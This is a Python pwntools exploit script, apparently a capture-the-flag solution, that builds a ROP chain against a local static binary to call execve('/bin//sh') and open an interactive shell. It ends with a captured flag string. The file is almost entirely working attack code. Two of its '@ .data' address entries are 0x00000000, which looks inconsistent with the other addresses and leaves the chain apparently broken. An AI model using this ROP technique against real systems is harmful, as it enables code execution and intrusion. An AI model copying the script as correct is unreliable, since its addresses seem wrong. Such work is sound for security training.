#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./static')


io = process("./static")
print(io.recvuntil("most..."))
'''
1. zero out eax
2. acx points to null
3. edx points to null
4. ebx points to "/bin//sh"
5. eax is 0xb
6. int 0x80
'''
pay = ''
pay += p32(0x0806eb8b) # pop edx ; ret
pay += p32(0x00000000) # @ .data
pay += p32(0x080a8cb6) # pop eax ; ret
pay += '/bin'
pay += p32(0x08056c45) # mov dword ptr [edx], eax ; ret
pay += p32(0x0806eb8b) # pop edx ; ret
pay += p32(0x080da064) # @ .data + 4
pay += p32(0x080a8cb6) # pop eax ; ret
pay += '//sh'
pay += p32(0x08056c45) # mov dword ptr [edx], eax ; ret
pay += p32(0x0806eb8b) # pop edx ; ret
pay += p32(0x080da068) # @ .data + 8
pay += p32(0x08056200) # xor eax, eax ; ret
pay += p32(0x08056c45) # mov dword ptr [edx], eax ; ret
pay += p32(0x080481c9) # pop ebx ; ret
pay += p32(0x00000000) # @ .data
pay += p32(0x0806ebb2) # pop ecx ; pop ebx ; ret
pay += p32(0x080da068) # @ .data + 8
pay += p32(0x00000000) # padding without overwrite ebx
pay += p32(0x0806eb8b) # pop edx ; ret
pay += p32(0x080da068) # @ .data + 8
pay += p32(0x08056200) # xor eax, eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x0807c01a) # inc eax ; ret
pay += p32(0x08049533) # int 0x80

print("pay: "+pay)
print("pay len: "+str(len(pay)))
print("=================sending pay===============")

io.sendline(pay)
io.interactive()

#flag 6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}

